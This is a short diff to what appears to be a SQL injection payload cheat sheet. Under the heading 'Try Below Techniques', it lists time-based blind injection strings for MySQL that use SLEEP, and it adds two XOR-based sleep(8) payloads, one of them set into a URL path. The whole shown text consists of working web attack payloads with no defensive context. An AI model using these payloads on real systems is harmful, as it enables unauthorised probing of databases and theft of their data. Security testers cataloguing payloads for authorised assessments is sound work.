@@ -56,7 +56,9 @@ Try Below Techniques:
 " AND SLEEP(5)--  
 1 AND SLEEP(5)--  
 ' OR IF(1=1, SLEEP(5), 0)--  
-' AND (SELECT * FROM users LIMIT 1) AND SLEEP(5)--  
+' AND (SELECT * FROM users LIMIT 1) AND SLEEP(5)--
+/‘XOR(if(now()=sysdate(),sleep(8),0))XOR’111/
+/page/‘XOR(if(now()=sysdate(),sleep(8),0))XOR’111/test.test
 
  ```
 ### MSSQL (Microsoft SQL Server)
